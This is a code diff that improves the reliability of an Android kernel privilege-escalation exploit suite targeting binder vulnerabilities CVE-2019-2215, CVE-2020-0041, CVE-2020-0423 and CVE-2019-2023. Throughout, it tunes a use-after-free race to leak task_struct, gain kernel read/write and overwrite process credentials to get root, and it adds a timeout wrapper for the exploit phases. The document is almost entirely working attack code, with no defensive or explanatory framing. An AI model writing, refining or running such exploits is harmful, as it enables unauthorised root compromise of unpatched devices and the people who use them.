@@ -430,7 +430,7 @@ static int setup_kernel_rw(void) {
 static int exploit_cve_2020_0423_rw(void) {
     printf("[*] Attempting kernel RW via CVE-2020-0423 UAF...\n");
 
-    for (int attempt = 0; attempt < 5; attempt++) {
+    for (int attempt = 0; attempt < 4; attempt++) {
         int binder_fd = open("/dev/binder", O_RDWR);
         if (binder_fd < 0) { perror("  open binder"); continue; }
 
@@ -443,6 +443,14 @@ static int exploit_cve_2020_0423_rw(void) {
             close(binder_fd); close(epoll_fd); continue;
         }
 
+        int extra_fds[5];
+        for (int i = 0; i < 5; i++) {
+            extra_fds[i] = open("/dev/binder", O_RDWR);
+            if (extra_fds[i] >= 0) {
+                epoll_ctl(epoll_fd, EPOLL_CTL_ADD, extra_fds[i], &ev);
+            }
+        }
+
         int pipefd[2];
         if (pipe(pipefd) < 0) { perror("  pipe"); close(binder_fd); close(epoll_fd); continue; }
         if (fcntl(pipefd[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
@@ -451,39 +459,53 @@ static int exploit_cve_2020_0423_rw(void) {
             continue;
         }
 
-        pid_t pid = fork();
-        if (pid < 0) { perror("  fork"); close(binder_fd); close(epoll_fd); close(pipefd[0]); close(pipefd[1]); continue; }
-
-        if (pid == 0) {
-            usleep(50000 + (attempt * 10000));
-            ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
-            _exit(0);
-        }
-
         void *buf = mmap_page(0x100000000UL);
         if (!buf) {
             close(binder_fd); close(epoll_fd); close(pipefd[0]); close(pipefd[1]);
             continue;
         }
 
-        struct iovec iov[2];
-        iov[0].iov_base = buf;
-        iov[0].iov_len = PAGE_SIZE;
-        iov[1].iov_base = buf;
-        iov[1].iov_len = PAGE_SIZE;
+        pid_t pid = fork();
+        if (pid < 0) {
+            perror("  fork");
+            close(binder_fd); close(epoll_fd); close(pipefd[0]); close(pipefd[1]);
+            continue;
+        }
 
-        ssize_t n = readv(pipefd[0], iov, 2);
+        if (pid == 0) {
+            usleep(50000 + (attempt * 10000));
+            for (int i = 0; i < 5; i++) {
+                ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
+            }
+            for (int i = 0; i < 5; i++) {
+                if (extra_fds[i] >= 0) ioctl(extra_fds[i], BINDER_THREAD_EXIT, NULL);
+            }
+            close(binder_fd);
+            close(epoll_fd);
+            close(pipefd[0]);
+            close(pipefd[1]);
+            _exit(0);
+        }
+
+        struct pollfd pfd = {.fd = pipefd[0], .events = POLLIN};
+        int pret = poll(&pfd, 1, TIMEOUT_MS);
+        ssize_t n = -1;
+        if (pret > 0) {
+            n = read(pipefd[0], buf, PAGE_SIZE);
+        } else if (pret == 0) {
+            printf("  [-] poll timeout attempt %d\n", attempt);
+        } else {
+            perror("  poll");
+        }
+
         wait(NULL);
-
         close(binder_fd);
         close(epoll_fd);
         close(pipefd[0]);
         close(pipefd[1]);
+        for (int i = 0; i < 5; i++) if (extra_fds[i] >= 0) close(extra_fds[i]);
 
-        if (n < 0) {
-            printf("  [-] readv failed, attempt %d\n", attempt);
-            continue;
-        }
+        if (n <= 0) continue;
 
         uint64_t *data = (uint64_t *)buf;
         for (size_t i = 0; i < (size_t)(n / 8); i++) {
@@ -497,14 +519,8 @@ static int exploit_cve_2020_0423_rw(void) {
                         g_al_off = g_offset_candidates[ci].al;
                         printf("  [+] Leaked task_struct @ 0x%llx (cred_off=0x%x, al_off=0x%x)\n",
                                (unsigned long long)g_task_struct, g_cred_off, g_al_off);
-                        if (pipe(g_krw_pipe) < 0) {
-                            perror("  pipe for RW");
-                            return -1;
-                        }
-                        if (fcntl(g_krw_pipe[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
-                            perror("  fcntl for RW");
-                            return -1;
-                        }
+                        if (pipe(g_krw_pipe) < 0) return -1;
+                        if (fcntl(g_krw_pipe[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) return -1;
                         return 0;
                     }
                 }
@@ -849,6 +865,25 @@ static void gather_system_info(void) {
     printf("[INFO] === End System Information ===\n\n");
 }
 
+static int run_exploit_with_timeout(int (*func)(void), int timeout_sec) {
+    pid_t pid = fork();
+    if (pid == 0) {
+        exit(func() == 0 ? 0 : 1);
+    }
+    int status;
+    int remaining = timeout_sec;
+    while (remaining > 0) {
+        if (waitpid(pid, &status, WNOHANG) == pid) {
+            return (WIFEXITED(status) && WEXITSTATUS(status) == 0) ? 0 : -1;
+        }
+        sleep(1);
+        remaining--;
+    }
+    kill(pid, SIGKILL);
+    waitpid(pid, NULL, 0);
+    return -1;
+}
+
 int main(void) {
     int cve_2019_2023_handle = -1;
     int cve_2215_ok = 0;
@@ -856,7 +891,7 @@ int main(void) {
     int kernel_rw_obtained = 0;
 
     printf("==================================================\n");
-    printf("  Unified CVE Exploitation Suite v3.1 (Enhanced)\n");
+    printf("  Unified CVE Exploitation Suite v3.2 (Stable)\n");
     printf("  (CVE-2019-2215, 2020-0041, 2020-0423, 2019-2023)\n");
     printf("==================================================\n\n");
 
@@ -888,7 +923,7 @@ int main(void) {
     }
 
     printf("\n[PHASE 5] CVE-2020-0423 (UAF) Kernel RW attempt\n");
-    if (exploit_cve_2020_0423_rw() == 0) {
+    if (run_exploit_with_timeout(exploit_cve_2020_0423_rw, 15) == 0) {
         kernel_rw_obtained = 1;
         printf("  [+] Kernel RW via CVE-2020-0423 obtained!\n");
         if (setup_kernel_rw() == 0) {
@@ -898,11 +933,11 @@ int main(void) {
             }
         }
     } else {
-        printf("  [-] CVE-2020-0423 RW failed\n");
+        printf("  [-] CVE-2020-0423 RW failed or timed out\n");
     }
 
     printf("\n[PHASE 6] CVE-2020-0041 (OOB) cred overwrite attempt\n");
-    if (exploit_cve_2020_0041_patch_cred() == 0) {
+    if (run_exploit_with_timeout(exploit_cve_2020_0041_patch_cred, 5) == 0) {
         if (getuid() == 0) { final_root_check(); return 0; }
     }
 
